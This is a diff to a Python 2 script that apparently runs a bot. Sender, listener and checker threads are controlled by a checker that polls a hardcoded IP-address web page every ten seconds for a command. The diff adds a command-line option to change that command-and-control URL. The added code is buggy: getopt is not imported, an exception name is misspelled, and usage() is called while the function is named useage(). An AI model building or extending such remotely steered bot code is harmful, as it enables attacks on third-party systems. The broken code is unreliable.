@@ -2,6 +2,7 @@
 
 #!/usr/bin/python
 
+import sys
 import threading
 import Queue
 import socket
@@ -18,6 +19,26 @@ MESSAGE = 0
 bots = 0
 exit = 0
 cmd = 1
+url = "http://176.31.191.50/index.html"
+
+def main(argv):
+    global url
+    try:
+        opts, args = getopt.getopt(argv, "hu", ["help", "URL="])
+    except getopt.Getopterror:
+        usage()
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt in ("-h", "--help"):
+            usage()
+            sys.exit()
+        elif opt in ("-u", "--URL"):
+            url = arg
+    return
+
+def useage():
+    print 'This is how we roll... lolz'
+    return
 
 def sender(): # sends until something changes exit to 1
     global exit
@@ -46,7 +67,7 @@ def checker(): ## TODO: Accept a URL as input maybe?
     while exit == 0:
         print 'Parsing...'
         global cmd
-        url = "http://176.31.191.50/index.html"
+        global url
         response = urllib2.urlopen(url)
         html = response.read()
         soup = BeautifulSoup(html)
@@ -55,6 +76,10 @@ def checker(): ## TODO: Accept a URL as input maybe?
         print 'Parsing result is', cmd
         time.sleep(10)
     return
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
+
 s = threading.Thread(name='Sender', target=sender)
 l = threading.Thread(name='Listener', target=listener)
 c = threading.Thread(name='Checker', target=checker)
